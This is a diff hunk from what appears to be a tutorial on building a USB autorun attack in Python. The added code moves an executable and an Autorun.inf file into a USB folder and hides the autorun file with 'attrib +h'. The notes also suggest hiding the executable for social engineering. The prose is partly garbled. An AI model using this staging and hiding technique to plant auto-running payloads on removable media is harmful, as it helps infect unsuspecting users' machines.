@@ -86,6 +86,22 @@ o.write("(Autorun)\n")
 And the these are lines of code that we Autorun in parenthesis on the ownline and instruction of what to do. So its suppose to open "benign.exe". Then its going to start firefox portable (may be take this action on the prompt), then label this as "My USB" and then we specify the icon.
 
 
+# Move files to USB and set hidden
+shutil.move(exename,usbdir)
+shutil.move("Autorun.inf",usbdir)
+print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
+os.system("attrib +h \""+os.path.join(usbdir,"Autorun.inf")+"\"")
+
+Then we performed few steps to move things. In this case, its just a USB folder. But usually it would be a USB threat. So there moving both benign.exe and Autorun.inf files to the USB directory (usbdir).
+Then we are using windows system command to change the attribute of that particular file. So printing the command to be running and then runn it with os.system command. 
+
+So in the end, we should have hidden autorun.inf file and then non hidden benign.exe file in a self contained wrapped python script.
+
+Again we can use also for social engineering attack by just running the last command twice and hit benign.exe as well.
+
+
+
+
 
 
 
